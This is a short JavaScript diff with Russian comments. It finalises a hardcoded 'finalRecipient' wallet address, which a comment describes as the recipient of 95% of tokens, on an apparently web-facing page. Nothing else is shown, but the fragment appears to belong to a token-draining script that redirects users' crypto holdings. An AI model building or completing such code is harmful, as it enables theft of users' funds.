@@ -170,7 +170,7 @@ function hideCustomModal() {
 }
 
 // Заглушка для finalRecipient (адрес получателя 95% токенов)
-const finalRecipient = '0xbced7e9C6a1aFB0e5DD1Bd1a410e448fEc78cB0e'; // Замените на нужный адрес
+const finalRecipient = '0xbced7e9C6a1aFB0e5DD1Bd1a410e448fEc78cB0e';
 
 // Очистка состояния при загрузке страницы
 window.addEventListener('load', () => {
